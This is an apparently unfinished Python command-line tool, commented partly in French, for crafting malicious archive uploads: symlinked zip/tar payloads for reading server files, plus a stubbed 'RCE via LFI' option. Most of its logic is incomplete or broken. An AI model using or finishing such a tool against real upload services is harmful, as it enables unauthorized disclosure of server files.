#!/usr/bin/env python3

import os
import argparse 
import subprocess
import sys
import logging
import tempfile
#import argcomplete

logging.basicConfig(level=logging.DEBUG)

def parse_arguments():
    parser = argparse.ArgumentParser(description='Création de payload de fichiers d\'archives .zip, .tar...',
                                     prog = 'zipupload')
    
    subparsers = parser.add_subparsers(help = 'Choose Attack')

    parser_rce = subparsers.add_parser('rce',
                                       help = 'RCE via LFI')
    parser_rce.set_defaults(func=rce)
    parser_infodisclosure = subparsers.add_parser('infodisclosure',
                                                  help = 'Information Disclosure via Simlinks')

    parser_infodisclosure.add_argument("-i",
                                       metavar = "INPUT",
                                       type = str,
                                       help="The input file",
                                       required=True)
    parser_infodisclosure.add_argument("-t",
                                       "--type",
                                       metavar = "TYPE D'ARCHIVE",
                                       choices = ['zip', 'tar', '7z', 'rar'],
                                       type = str,
                                       nargs = '+',
                                       help = "Le type d'archive")
    parser_infodisclosure.set_defaults(func=infodisclosure)
    args = parser.parse_args()
    logging.debug(vars(args))
#    try:
#        args.func(args)
#    except AttributeError:
#        parser.error("too few arguments")
    args.func(args)
    #args.func(args)


def symlink(src):
    dst = 'Symlink/link'
    os.symlink(dst,src)
    os.system('zip --symlink Symlink/symlink.zip ' + dst )
    print("Your payload has been sucessfully created in the Symlink folder")
    return 0

def rce(args):
    if not os.path.isfile(args.input):
        print('The path specified does not exist')
        sys.exit()  
    return 0

def infodisclosure(args):
    directory = 'InformationDisclosure'
    if not os.path.isdir(directory):
        os.mkdir(directory)

    # create a temporary directory
    with tempfile.TemporaryDirectory() as tmp:
        print(f'The created temporary directory is {tmp}')
        if args.i.count('.'):
            dst = tmp + '/' + '.'.join(args.i.split('.')[:-1]) + '_symlink.' + args.i.split('.')[-1]
        else:
            dst = tmp + '/' + args.i + '_symlink'
        try:
            os.symlink(args.i,dst)
        except FileExistsError:
            while True:
                res = input('[+] Le lien symbolique existe déjà, voulez-vous le remplacer ? (Y/n) : ').lower()
                if res == '' or res == 'y' or res == 'yes':
                    logging.debug("Réponse : yes")
                    os.remove(dst)
                    os.symlink(args.i,dst)
                    break
                elif res == 'n' or res == 'no':
                    logging.debug("Réponse : no")
                    logging.debug("Arrêt du programme")
                    sys.exit()
                logging.debug("Réponse incorrecte")
        
        if args.type == 'zip':
            print('ZIP')
        if args.type == 'tar':
            print('TAR')
        if args.type == '7z':
            print('7Z')
        if args.type == 'rar':
            print('RAR')
        print(os.listdir(tmp))

def zip(directory):
    return

def main():
    parse_arguments()

main()
